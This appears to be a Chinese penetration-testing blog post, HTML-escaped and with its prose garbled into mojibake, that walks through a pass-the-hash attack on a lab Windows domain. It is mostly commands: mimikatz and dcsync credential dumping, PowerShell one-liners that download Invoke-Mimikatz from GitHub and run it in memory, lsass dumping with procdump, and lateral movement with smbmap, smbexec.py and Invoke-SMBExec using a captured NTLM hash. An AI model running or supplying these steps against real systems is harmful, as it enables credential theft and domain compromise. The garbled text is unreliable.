&lt;p&gt;é¦–å…ˆæˆ‘ä»¬å‡è®¾æ‹¿åˆ°äº†ä¸€å°å†…ç½‘æœºå™¨ï¼Œè¿™å°å†…ç½‘æœºå™¨å¯èƒ½æ˜¯åŸŸç”¨æˆ·å¯èƒ½ä¹Ÿæ˜¯æœ¬åœ°ç”¨æˆ·ï¼Œé¦–å…ˆè¦é€šè¿‡ææƒåˆ°systemæƒé™æ‰å¯ä»¥å¯¼å‡ºhashå€¼ï¼Œç„¶ååˆ©ç”¨æœ¬åœ°ä¿å­˜çš„hashå»ç™»å½•å†…ç½‘çš„å…¶ä»–æœºå™¨ï¼Œè¿˜å¯ä»¥æ‰§è¡Œæ‰¹é‡çš„æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;åœ¨åŸŸç¯å¢ƒä¸­ï¼Œåˆ©ç”¨pass the hashçš„æ¸—é€æ–¹å¼å¾€å¾€æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è·å¾—ä¸€å°åŸŸä¸»æœºçš„æƒé™&lt;/li&gt;
&lt;li&gt;Dumpå†…å­˜è·å¾—ç”¨æˆ·hash&lt;/li&gt;
&lt;li&gt;é€šè¿‡pass the hashå°è¯•ç™»å½•å…¶ä»–ä¸»æœº&lt;/li&gt;
&lt;li&gt;ç»§ç»­æœé›†hashå¹¶å°è¯•è¿œç¨‹ç™»å½•&lt;/li&gt;
&lt;li&gt;ç›´åˆ°è·å¾—åŸŸç®¡ç†å‘˜è´¦æˆ·hashï¼Œç™»å½•åŸŸæ§ï¼Œæœ€ç»ˆæˆåŠŸæ§åˆ¶æ•´ä¸ªåŸŸ&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ¯”å¦‚æˆ‘ä»¬ç°åœ¨çš„ç¯å¢ƒæ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;DCï¼š172.16.0.106(åŸŸç®¡ç”¨æˆ·testuser)&lt;/p&gt;
&lt;p&gt;Win7ï¼š172.16.0.105(æœ¬åœ°ç®¡ç†å‘˜sc92n)&lt;/p&gt;
&lt;p&gt;åŸŸï¼šhack.lab&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬éœ€è¦ä»win 7ç™»å½•åˆ°DCï¼Œç°åœ¨æˆ‘ä»¬å…ˆå»åˆ©ç”¨å·¥å…·è·å–åˆ°hashçš„å€¼ã€‚&lt;/p&gt;
&lt;h2 id=&#34;è·å–hash&#34;&gt;è·å–Hash&lt;/h2&gt;
&lt;p&gt;æˆ‘ä»¬è¿›è¡Œpthçš„è¿‡ç¨‹éœ€è¦è·å–åˆ°ç›¸å…³çš„hashæ‰å¯ä»¥è¿›è¡Œã€‚&lt;/p&gt;
&lt;h3 id=&#34;mimikatz&#34;&gt;Mimikatz&lt;/h3&gt;
&lt;p&gt;å¯ä»¥åˆ°GitHubä¸‹è½½æ–°ç‰ˆçš„ï¼šhttps://github.com/gentilkiwi/mimikatz&lt;/p&gt;
&lt;p&gt;è¯»å–lsassè¿›ç¨‹çš„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::msv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤è·å–å…¨éƒ¨ç”¨æˆ·çš„å¯†é’¥å’Œæ˜æ–‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::logonPasswords
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¯»å–SAMæ•°æ®åº“è·å–ç”¨æˆ·Hash,è·å–ç³»ç»Ÿæ‰€æœ‰æœ¬åœ°ç”¨æˆ·çš„hashï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;token::elevate
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsadump::sam
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¹Ÿå¯ä»¥ä½¿ç”¨&lt;code&gt;dcsync&lt;/code&gt;åŠŸèƒ½å¯¼å‡ºåŸŸå†…çš„æ‰€æœ‰hashï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsadump::dcsync /domain:test.local /all /csv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cobalt-strike&#34;&gt;Cobalt Strike&lt;/h3&gt;
&lt;p&gt;è¿™å—æ²¡æœ‰æµ‹è¯•çš„ç¯å¢ƒå°±ä¸å†å±•å¼€ï¼Œç›¸ä¿¡ç†Ÿæ‚‰csçš„å°ä¼™ä¼´ä¹ŸçŸ¥é“è¿™ä¸ªåŠŸèƒ½,å…·ä½“åŠŸèƒ½åœ¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;é€‰ä¸­å®¢æˆ·ç«¯åˆ—è¡¨-&amp;gt;å³é”®é€‰æ‹©Accessçš„æ¨¡å—ä¸­çš„Dump Hashes&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è¯»å–åˆ°çš„å‡­è¯å¯ä»¥åœ¨èœå•æ çš„&lt;code&gt;view-Credentials&lt;/code&gt;ä¸­æŸ¥çœ‹ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;å¯¼å‡ºåŸŸå†…çš„æ‰€æœ‰hashå¯ä»¥ä½¿ç”¨Beaconçš„hashdumpã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¯¼å‡ºåŸŸå†…çš„æ‰€æœ‰hashå¯ä»¥ä½¿ç”¨Beaconçš„dcsync&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æŸ¥è¯¢åŸŸå†…æ‰€æœ‰hash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dcsync [DOMAIN.FQDN]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æŸ¥è¯¢æŒ‡å®šç”¨æˆ·hash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dcsync [DOMAIN.FQDN] [DOMAIN\user]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;invoke-mimikatzps1&#34;&gt;Invoke-Mimikatz.ps1&lt;/h3&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯mimikatzçš„powershellç‰ˆæœ¬ï¼Œä¹Ÿç»å¸¸ç”¨äºåœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œç›¸å¯¹äºexeçš„ç‰ˆæœ¬ä¼šæ–¹ä¾¿è®¸å¤šã€‚&lt;/p&gt;
&lt;p&gt;è¯¥è„šæœ¬é›†æˆåœ¨&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt;é¡¹ç›®ä¸­ï¼Œä¸‹è½½åœ°å€ï¼š&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1&#34;&gt;Invoke-Mimikatz.ps1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªå·¥å…·åœ¨å¦å¤–ä¸€ç¯‡æ–‡ç« æœ‰å†™è¿‡å…·ä½“çš„ç”¨æ³•&lt;a href=&#34;https://xxe.icu/posts/powershell-attack/#invoke-mimikatz&#34;&gt;Powershellåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ— æ–‡ä»¶è¯»å–æ–¹å¼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;); Invoke-Mimikatz -DumpCreds&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è¯»å–samæ•°æ®åº“&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&amp;#39;); Invoke-Mimikatz -Command \&amp;#34;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;privilege&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debug&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;elevate&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;lsadump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sam&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ¨è¿™é‡Œæ’ä¸€ç‚¹å†…å®¹ï¼Œä¸»è¦æ˜¯è·å–åŸŸç”¨æˆ·çš„hashå€¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&lt;a href=&#34;https://github.com/EmpireProject/Empire&#34;&gt;Empire&lt;/a&gt;çš„&lt;a href=&#34;https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1&#34;&gt;Invoke-DCSync.ps1&lt;/a&gt;å·¥å…·æ¥è·å–ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-DCSync -DumpForest | ft -wrap -autosize
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å¯¼å‡ºæŒ‡å®šè´¦æˆ·çš„hash
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-DCSync -DumpForest -Users @(&amp;#34;administrator&amp;#34;) | ft -wrap -autosize
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;crackmapexec&#34;&gt;CrackMapExec&lt;/h3&gt;
&lt;p&gt;è¯¥å·¥å…·ä¹Ÿå¯ä»¥å¯¼å‡ºhashï¼Œè€Œä¸”è¿˜æ˜¯æ‰¹é‡çš„ï¼Œå…·ä½“åœ¨å®˜æ–¹gitbookä¸Šå†™å¾—å¾ˆæ˜ç»†äº†ï¼Œè¿™é‡Œä¸å†å±•å¼€ï¼Œåç»­ä¼šä¸“é—¨å†™ä¸€éå…³äºè¯¥å·¥å…·çš„æ–‡ç« ã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://mpgn.gitbook.io/crackmapexec/getting-started/installation&#34;&gt;https://mpgn.gitbook.io/crackmapexec/getting-started/installation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¯¼å‡ºå‡­è¯ï¼ˆéœ€è¦æœ‰ç®¡ç†å‘˜æƒé™ï¼‰ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials&#34;&gt;https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;è½¬å‚¨lsassè¿›ç¨‹&#34;&gt;è½¬å‚¨lsassè¿›ç¨‹&lt;/h3&gt;
&lt;p&gt;å› ä¸ºæˆ‘ä»¬çš„å‡­è¯é™¤äº†æŠ¥é”™åœ¨samæ–‡ä»¶ä¸­ï¼Œè¿˜å¯ä»¥åœ¨lsassè¿›ç¨‹ä¿å­˜ï¼Œç°åœ¨æ‰¾åˆ°lsassè¿›ç¨‹,ç„¶ååˆ›å»ºè½¬å‚¨æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸€èˆ¬ä¼šä¿å­˜åœ¨&lt;code&gt;C:\Users\ç”¨æˆ·å\AppData\Local\Temp\lsass.DMP&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å°†è¯¥æ–‡ä»¶ä¸‹è½½å›æ¥æ”¾ç½®åœ¨Mimikatzçš„åŒç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::minidump lsass.DMP
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::logonPasswords full
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨&lt;code&gt;procdump&lt;/code&gt;è¿™ä¸ªç¨‹åºæ¥å¯¼å‡ºlsass.dmpï¼Œåªéœ€åœ¨å‘½ä»¤è¡Œè·å–systemæƒé™æ“ä½œå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;è¯¥å·¥å…·æ˜¯å¾®è½¯å®˜æ–¹çš„ä¸€æ¬¾å·¥å…·ï¼š&lt;a href=&#34;https://download.sysinternals.com/files/Procdump.zip&#34;&gt;&lt;strong&gt;Download ProcDump&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯å¯¼å‡ºlass.dmpï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;32ä½æœºå™¨ï¼šprocdump.exe -accepteula -ma lsass.exe lsass.dmp 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;64ä½æœºå™¨ï¼šprocdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;pass-the-hash&#34;&gt;Pass The Hash&lt;/h2&gt;
&lt;p&gt;å¦‚æœå†…ç½‘ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·å¯†ç ç›¸åŒï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡pass the hashè¿œç¨‹ç™»å½•åˆ°ä»»æ„ä¸€å°ä¸»æœºï¼Œæ“ä½œç®€å•ã€å¨åŠ›æ— ç©·ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢ä¼šä½¿ç”¨å‡ ç§æ–¹æ³•æ¥è¿›è¡Œæ”»å‡»ï¼Œç”¨åˆ°çš„å·¥å…·æœ‰Smbmapã€CrackMapExecã€Smbexecç­‰ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚æˆ‘ä»¬ç°åœ¨çš„ç¯å¢ƒæ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;DCï¼š172.16.0.106(åŸŸç®¡ç”¨æˆ·testuser)&lt;/p&gt;
&lt;p&gt;Win7ï¼š172.16.0.105(ä»è¿™å°è·å–åˆ°äº†hash)&lt;/p&gt;
&lt;p&gt;kaliï¼š172.16.0.107&lt;/p&gt;
&lt;p&gt;åŸŸï¼šhack.lab&lt;/p&gt;
&lt;p&gt;testuserçš„hashï¼šde26cce0356891a4a020e7c4957afc72&lt;/p&gt;
&lt;h3 id=&#34;smbmap&#34;&gt;Smbmap&lt;/h3&gt;
&lt;p&gt;SMBMAPå…è®¸ç”¨æˆ·åœ¨æ•´ä¸ªåŸŸä¸­æšä¸¾Sambaå…±äº«é©±åŠ¨å™¨ã€‚åˆ—å‡ºå…±äº«é©±åŠ¨å™¨ï¼Œé©±åŠ¨ç¨‹åºæƒé™ï¼Œå…±äº«å†…å®¹ï¼Œä¸Šè½½/ä¸‹è½½åŠŸèƒ½ï¼Œæ–‡ä»¶åè‡ªåŠ¨ä¸‹è½½æ¨¡å¼åŒ¹é…ï¼Œç”šè‡³æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/ShawnDEvans/smbmap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; smbmap
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…ä¸€ä¸‹æ¨¡å—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -m pip install -r requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ¬¾å·¥å…·kaliä¹Ÿæœ‰å†…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;smbmap -u testuser -p &amp;#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&amp;#39; -H 172.16.0.106 -d hack.lab -x &amp;#39;whoami&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;aad3b435b51404eeaad3b435b51404eeä¸Šæˆ‘ä»¬è®²è¿‡æ˜¯LM hashé»˜è®¤çš„å€¼&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;smbexecpy&#34;&gt;smbexec.py&lt;/h3&gt;
&lt;p&gt;smbexec.pyæ˜¯&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;impacket&lt;/a&gt;é‡Œé¢çš„ä¸€ä¸ªå·¥å…·ï¼Œåœ¨kaliæ˜¯å·²ç»é¢„è£…å¥½çš„ï¼Œå¦‚æœæ²¡æœ‰å®‰è£…å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 -m pip install impacket
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‘èµ·pthæ”»å‡»å‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;smbexec.py hack.lab/testuser@172.16.0.106 -hashes &lt;span class=&#34;s1&#34;&gt;&amp;#39;aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;invoke-smbexec&#34;&gt;Invoke-SMBExec&lt;/h3&gt;
&lt;p&gt;å½“ç„¶ï¼Œé™¤äº†æœ‰pythonç‰ˆæœ¬ä¹Ÿæœ‰powershellçš„ç‰ˆæœ¬ï¼Œåœ¨&lt;a href=&#34;https://github.com/Kevin-Robertson/Invoke-TheHash&#34;&gt;Invoke-TheHash&lt;/a&gt;é¡¹ç›®ä¸­æœ‰ä¸ªè„šæœ¬æ–‡ä»¶&lt;code&gt;Invoke-SMBExec.ps1&lt;/code&gt;,å¤§å®¶å¯ä»¥ç›´æ¥åœ¨ä¸Šé¢è¿›è¡Œä¸‹è½½&lt;/p&gt;
&lt;p&gt;ä¸‹è½½é“¾æ¥ï¼š&lt;a href=&#34;https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1&#34;&gt;Invoke-SMBExec.ps1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æ‰§è¡Œå‘½ä»¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Modle&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-SMBExec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-SMBExec&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Target&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Domain&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;lab&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Username&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;testuser&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Hash&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de26cce0356891a4a020e7c4957afc72&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;calc.exe&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç»“æœå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
&lt;p&gt;å› ä¸ºè¿™æ¬¾å·¥å…·æ‰§è¡Œå‘½ä»¤ä¸ä¼šè¿”å›ç»“æœï¼Œå¯ä»¥ä½¿ç”¨csæˆ–è€…msfçš„powershellå‘½ä»¤è¿›è¡Œè¿œç¨‹ä¸Šçº¿ï¼Œä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œåä¼šåœ¨ç›®æ ‡ä¸»æœºç”Ÿæˆä¸€ä¸ªå½“å‰æƒé™çš„è®¡ç®—å™¨ï¼š&lt;/p&gt;
